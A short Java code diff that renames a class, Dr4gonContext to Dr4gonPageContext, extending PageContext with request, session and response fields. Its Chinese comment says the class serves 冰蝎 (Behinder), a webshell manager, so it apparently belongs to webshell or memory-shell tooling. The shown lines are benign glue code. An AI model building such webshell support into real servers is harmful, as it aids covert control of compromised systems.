@@ -15,11 +15,11 @@ import java.util.Enumeration;
 
 
 //冰蝎要用的PageContext
-public class Dr4gonContext extends PageContext {
+public class Dr4gonPageContext extends PageContext {
     public Request request;
     public HttpSession session;
     public Response response;
-    public Dr4gonContext(Request request,Response response,HttpSession session){
+    public Dr4gonPageContext(Request request, Response response, HttpSession session){
         this.session=session;
         this.request=request;
         this.response=response;
